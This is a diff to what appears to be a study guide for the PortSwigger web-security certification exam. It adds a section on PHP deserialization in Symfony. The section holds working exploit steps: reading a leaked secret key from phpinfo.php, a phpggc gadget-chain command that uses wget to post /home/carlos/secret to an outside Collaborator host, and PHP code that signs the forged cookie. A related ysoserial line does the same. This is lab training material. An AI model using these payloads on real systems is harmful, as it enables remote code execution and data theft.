@@ -68,6 +68,10 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ![git-cola](images/git-cola.png)  
 
 [PortSwigger Lab: Information disclosure in version control history](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history)  
+
+>Always open source code to look for any developer comments that reveal hidden files or paths. Below example lead to [symphony token deserialization](#deserialization).  
+
+![dev-code-debug-comment deserial](images/dev-code-debug-comment.png)  
   
 ## DOM-Based XSS  
 
@@ -2549,6 +2553,7 @@ fileurl=https://EXPLOIT.net/images.sVg
 [CustomTemplate PHP](#customtemplate-php)  
 [Burp Deserialization Scanner](#burp-deserialization-scanner)  
 [YsoSerial](#ysoserial)  
+[SHA1 HMAC Symfony](#sha1-hmac-symfony)  
   
 ### CustomTemplate PHP  
 
@@ -2575,14 +2580,6 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ![modify-serial-cookie](images/modify-serial-cookie.png)  
   
 [PortSwigger Lab: Arbitrary object injection in PHP](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php)  
-
->**Note:** In BSCP exam not going to run this as it delete the file, but in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using PHPGGC.  
-
-```
-./phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64
-```  
-
-[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
   
 ### Burp Deserialization Scanner  
 
@@ -2622,6 +2619,34 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
 ![ysoserial Command](images/ysoserial-command.png)  
 
 [PortSwigger Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)  
+  
+### SHA1 HMAC Symfony
+
+>***Identify*** that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash. On the home page we discover a developer comment to debug info for ``` ```, revealing the digital signature to sign new token.   
+
+>**Note:** In BSCP exam not going to run this as it delete the file, but in exam read source code to ***identify*** the ```unserialize()``` PHP function and extract content out-of-band using ```PHPGGC```.  
+
+>Exploit steps to perform a PHP deserialization with a pre-built gadget chain.  
+
+1. Request the ```/cgi-bin/phpinfo.php``` file to find the leaked ```SECRET_KEY``` information about the website.  
+2. Generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony ```phpggc Symfony/RCE4 exec 'wget http://Collaborator.com --post-file=/home/carlos/secret' | base64 -w 0```.  
+3. Construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained.  
+
+```php
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```  
+  
+![Symfony phpggc gadget deserial](images/symphony-phpgcc.png)  
+
+>Replace cookie value and send request to get remote code execution when cookie is deserialised server side.  
+
+[PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
+   
+  
   
 ## OS Command Injection
 
